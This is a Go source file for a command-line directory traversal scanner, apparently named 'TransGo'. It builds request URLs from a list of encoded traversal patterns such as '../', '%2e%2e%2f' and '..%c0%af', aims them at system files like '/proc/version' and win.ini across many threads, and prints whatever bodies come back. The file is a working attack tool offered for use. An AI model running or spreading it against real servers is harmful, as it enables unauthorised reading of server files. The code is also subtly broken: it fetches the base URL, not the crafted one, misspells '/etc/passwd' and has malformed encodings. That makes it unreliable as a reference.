package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var banner = `
___________                             ________        
\__    ___/___________    ____   ______/  _____/  ____  
  |    |  \_  __ \__  \  /    \ /  ___/   \  ___ /  _ \ 
  |    |   |  | \// __ \|   |  \\___ \\    \_\  (  <_> )
  |____|   |__|  (____  /___|  /____  >\______  /\____/ 
                      \/     \/     \/        \/
`
// Platform stores platform name ex: linux and a file list usually found on that plaform
type Platform struct {
	name  string
	files []string
}

// AttackData stores information of the request and the obtained data
type AttackData struct {
	url        string
	platform   string
	file       string
	requestURL string
	data       string
	statusCode int
	pattern    string
}

var platforms = []Platform{
	{
		name: "linux",
		files: []string{
			"/proc/version",
			"/etc/password",
		},
	},
	{
		name: "windows",
		files: []string{
			"c:/windows/win.ini",
			"c:/windows/system32/drivers/etc/hosts",
		},
	},
}

var patterns = []string{
	"..",
	"../",
	"..\\",
	"%2e%2e\\",
	"%2e%2e%2f",
	"%2e%2e/",
	"..%2f",
	"%2e%2e%5c",
	"..%5c",
	"..%c1%1c",
	"..%c0%9v",
	"..%c0%af",
	"..%c1%9c",
	"%252e%252e%255c",
	"..%255c",
}

func show(atk AttackData) {
	fmt.Printf("url: %s\nrequest url: %s\nplatform: %s\nfile: %s\nsize: %d\nstatus code: %d\npattern: %s\n\n\n", atk.url, atk.requestURL, atk.platform, atk.file, len(atk.data), atk.statusCode, atk.pattern)
}

// IsValidURL Checks URL Validity
func IsValidURL(toTest string) bool {

	_, err := url.ParseRequestURI(toTest)
	if err != nil {
		return false
	}

	u, err := url.Parse(toTest)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return false
	}
	return true
}

// IsValidPlatform checks for platform validity
func IsValidPlatform(platform string) bool {
	switch platform {
	case
		"all",
		"linux",
		"windows":
		return true
	}
	return false
}

// IsValidThreads checks threadcount validity
func IsValidThreads(threads int) bool {
	if threads > 0 {
		return true
	}
	return false
}

// IsValidDepth checks for depth validity
func IsValidDepth(depth int) bool {
	if depth > 0 {
		return true
	}
	return false
}

// IsValidTimeout checks for timeout validity
func IsValidTimeout(timeout int) bool {
	if timeout > 0 {
		return true
	}
	return false
}

// ReadFile - reads a file onto string array returns [string], err
func ReadFile(filePath string) (lines []string, err error) {
	f, err := os.Open(filePath)
	if err != nil {
		return []string{}, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	err = scanner.Err()
	return lines, err
}

func getData(atk AttackData, httpClient http.Client, c chan AttackData) {
	var body string
	resp, err := httpClient.Get(atk.url)
	if err == nil && resp.StatusCode == 200 {
		buf := new(bytes.Buffer)
		buf.ReadFrom(resp.Body)
		body = buf.String()
		atk.data = body
		atk.statusCode = resp.StatusCode
	} else {
		atk.statusCode = 1
	}
	c <- atk
}

func performAttack(attackSublist []AttackData, timeoutSeconds int, c chan AttackData) {
	httpClient := http.Client{Timeout: time.Duration(timeoutSeconds) * time.Second}
	for _, atk := range attackSublist {
		getData(atk, httpClient, c)
	}
}

func generateURLPermutations(baseURL string, pattern string, depth int, fileName string) []string {
	var URLlist []string
	var baseURLlist []string
	var fileNameList []string
	if strings.HasSuffix(baseURL, "/") {
		urlNoslash := strings.TrimSuffix(baseURL, "/")
		baseURLlist = append(baseURLlist, urlNoslash)
	}
	baseURLlist = append(baseURLlist, baseURL)

	if strings.HasPrefix(fileName, "/") {
		fileNameList = append(fileNameList, strings.TrimPrefix(fileName, "/"))
	}

	if strings.HasSuffix(fileName, "/") {
		fileNameList = append(fileNameList, strings.TrimSuffix(fileName, "/"))
	}

	if strings.HasPrefix(fileName, "/") && strings.HasSuffix(fileName, "/") {
		fileNameList = append(fileNameList, strings.TrimPrefix(strings.TrimSuffix(fileName, "/"), "/"))
	}

	var reverseSlashFileNameList []string
	for _, f := range fileNameList {
		reverseSlashFileNameList = append(reverseSlashFileNameList, strings.ReplaceAll(f, "/", "\\"))
	}

	for _, url := range baseURLlist {
		for _, fName := range fileNameList {
			URLlist = append(URLlist, url+strings.Repeat(pattern, depth)+fName)
		}

		for _, rfName := range reverseSlashFileNameList {
			URLlist = append(URLlist, url+strings.Repeat(pattern, depth)+rfName)
		}
	}
	return URLlist
}

func generateAttackData(platformList []Platform, urlList []string, patternList []string, minDepth int, maxDepth int) []AttackData {
	var AttackDataList []AttackData
	for _, platform := range platformList {
		for _, url := range urlList {
			for _, pattern := range patterns {
				for d := minDepth; d < maxDepth; d++ {
					for _, file := range platform.files {
						var requestURLS = generateURLPermutations(url, pattern, d, file)
						for _, requestURL := range requestURLS {
							att := AttackData{
								url:        url,
								platform:   platform.name,
								file:       file,
								requestURL: requestURL,
								data:       "",
								statusCode: 0,
								pattern:    pattern,
							}
							AttackDataList = append(AttackDataList, att)
						}
					}
				}
			}
		}
	}
	return AttackDataList
}

func usage() {
	flag.Usage()
}

func main() {
	fmt.Println(banner)

	url := flag.String("u", "", "url to attack")
	urlsFile := flag.String("U", "", "file with urls to attack")
	platform := flag.String("p", "all", "platform to attack (all, linux, windows)")
	threads := flag.Int("t", 10, "number of threads to use")
	minDepth := flag.Int("m", 5, "min directory depth to test")
	maxDepth := flag.Int("d", 15, "max directory depth to test")
	timeout := flag.Int("to", 5, "timeout in seconds for requests")
	//searchPatern := flag.String("s", "", "only show results that match with this pattern")
	//pattern := flag.String("P", "", "transversal pattern to use ex: ../")
	//fileList := flag.String("F", "", "list of files to look for while searching")
	flag.Parse()

	if *url == "" && *urlsFile == "" {
		usage()
		os.Exit(1)
	}

	if *url != "" && !IsValidURL(*url) {
		fmt.Printf("[!] The url you entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if *urlsFile != "" {
		_, err := os.Open(*urlsFile)
		if err != nil {
			fmt.Printf("[!] Could not find '%s'\n", *urlsFile)
			usage()
			os.Exit(1)
		}
	}

	if !IsValidPlatform(*platform) {
		fmt.Printf("[!] The platform u've chosen is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !IsValidThreads(*threads) {
		fmt.Printf("[!] The thread count you've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !IsValidDepth(*minDepth) {
		fmt.Printf("[!] The min. depth u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if !IsValidDepth(*maxDepth) {
		fmt.Printf("[!] max. depth u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	if *minDepth > *maxDepth {
		fmt.Printf("[!] min. depth cannot be bigger than max. depth!\n")
		usage()
		os.Exit(1)
	}

	if !IsValidTimeout(*timeout) {
		fmt.Printf("[!] The timeout u've entered is invalid!\n")
		usage()
		os.Exit(1)
	}

	var urlList []string

	if *url != "" {
		urlList = append(urlList, *url)
	}

	if *urlsFile != "" {
		urlsFromFile, err := ReadFile(*urlsFile)
		if err == nil {
			for i := 0; i < len(urlsFromFile); i++ {
				urlList = append(urlList, urlsFromFile[i])
			}
		}
	}

	var platformList []Platform

	if *platform == "all" {
		platformList = platforms
	} else {
		for _, plat := range platforms {
			if plat.name == *platform {
				platformList = append(platformList, plat)
			}
		}
	}

	var attackDataList = generateAttackData(platformList, urlList, patterns, *minDepth, *maxDepth)
	var sublistSize = (int)(math.Ceil((float64)(len(attackDataList) / *threads)))
	dataChannels := make(chan AttackData, len(attackDataList))

	for i := 0; i < *threads; i++ {
		var attackSubList = attackDataList[sublistSize*(i) : sublistSize*(i+1)]
		go func(attackSubList []AttackData) {
			performAttack(attackSubList, *timeout, dataChannels)
		}(attackSubList)
	}

	for i := 0; i < len(attackDataList); i++ {
		atk := <-dataChannels
		fmt.Println(atk.data)
	}

}
